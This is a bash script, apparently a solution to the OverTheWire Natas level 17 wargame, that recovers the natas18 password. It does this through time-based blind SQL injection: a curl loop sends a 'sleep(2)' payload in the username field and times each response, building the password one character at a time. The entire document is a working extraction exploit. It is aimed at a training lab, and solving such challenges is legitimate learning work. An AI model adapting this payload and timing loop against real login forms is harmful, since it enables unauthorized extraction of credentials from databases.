#!/bin/bash

chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password=""

while [ ${#password} -lt 32 ]; do

	for ((i=0; i<${#chars}; i++)); do
		c="${chars:i:1}"
		init=$(date +%s)
		curl -X POST natas17.natas.labs.overthewire.org \
			-u natas17:NATAS17_PASSWORD \
			-d "username=natas18\" AND IF(password LIKE BINARY \"$password$c%\", sleep(2), False) -- " \
			-s > /dev/null
		end=$(date +%s)
		diff=$((end - init))
		printf "Char $c: $diff \n"
		if [ $diff -ge 2 ] && [ $diff -le 4 ]; then
			password+=$c
			printf "$password\n"
			break
		fi
	done
done
printf "Final password: $password"
